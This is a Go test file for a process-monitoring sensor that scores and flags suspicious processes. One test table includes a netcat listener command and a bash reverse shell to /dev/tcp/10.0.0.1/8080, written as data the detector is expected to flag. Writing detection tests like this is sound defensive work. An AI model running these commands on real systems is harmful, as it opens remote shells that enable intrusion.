package sensors

import (
	"context"
	"testing"
	"time"

	"github.com/verticedev/coagulation/pkg/logger"
	"github.com/verticedev/coagulation/pkg/metrics"
)

// TestProcessMonitorBaseline tests baseline establishment.
func TestProcessMonitorBaseline(t *testing.T) {
	log, _ := logger.NewLogger("test", "test", false)
	m := metrics.NewCollector("test", "test")
	
	pm := NewProcessMonitor(log, m)
	pm.buildBaseline()
	
	// Should have discovered some processes
	if len(pm.knownProcesses) == 0 {
		t.Error("Expected baseline to contain processes")
	}
	
	t.Logf("Baseline established with %d processes", len(pm.knownProcesses))
}

// TestProcessMonitorAnomalyDetection tests suspicious process detection.
func TestProcessMonitorAnomalyDetection(t *testing.T) {
	log, _ := logger.NewLogger("test-anomaly", "test", false)
	
	// Don't create metrics collector in tests (Prometheus registration issues)
	pm := &ProcessMonitor{
		logger:         log,
		metrics:        nil,
		anomalyScore:   0.0,
		knownProcesses: make(map[string]bool),
	}
	
	tests := []struct {
		name     string
		cmd      string
		expected bool
	}{
		{
			name:     "Netcat listener",
			cmd:      "/bin/sh -c nc -l 4444",
			expected: true,
		},
		{
			name:     "Bash reverse shell",
			cmd:      "/bin/bash -i >& /dev/tcp/10.0.0.1/8080",
			expected: true,
		},
		{
			name:     "Normal process",
			cmd:      "/usr/bin/vim file.txt",
			expected: false,
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := pm.isAnomalousProcess(tt.cmd)
			if result != tt.expected {
				t.Errorf("Expected %v for cmd '%s', got %v", tt.expected, tt.cmd, result)
			}
		})
	}
}

// TestProcessMonitorScoring tests anomaly score calculation.
func TestProcessMonitorScoring(t *testing.T) {
	log, _ := logger.NewLogger("test", "test", false)
	m := metrics.NewCollector("test", "test")
	
	pm := NewProcessMonitor(log, m)
	
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	
	if err := pm.Start(ctx); err != nil {
		t.Fatalf("Failed to start process monitor: %v", err)
	}
	
	// Wait for initial scan
	time.Sleep(2 * time.Second)
	
	score := pm.GetAnomalyScore()
	
	// Score should be between 0 and 1
	if score < 0.0 || score > 1.0 {
		t.Errorf("Anomaly score out of range: %f", score)
	}
	
	t.Logf("Current anomaly score: %f", score)
}

// BenchmarkProcessScan benchmarks process scanning performance.
func BenchmarkProcessScan(b *testing.B) {
	log, _ := logger.NewLogger("bench", "bench", false)
	m := metrics.NewCollector("bench", "bench")
	
	pm := NewProcessMonitor(log, m)
	pm.buildBaseline()
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		pm.checkProcesses()
	}
}
